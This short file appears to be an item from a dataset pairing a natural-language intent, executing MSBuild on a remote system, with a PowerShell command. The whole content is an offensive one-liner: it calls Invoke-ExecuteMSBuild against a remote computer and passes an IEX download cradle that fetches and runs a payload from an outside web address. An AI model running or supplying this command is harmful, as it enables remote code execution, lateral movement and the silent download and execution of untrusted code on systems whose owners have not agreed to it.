# Natural language intent:
# Execute MSBuild on a remote system

Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -Command IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload')
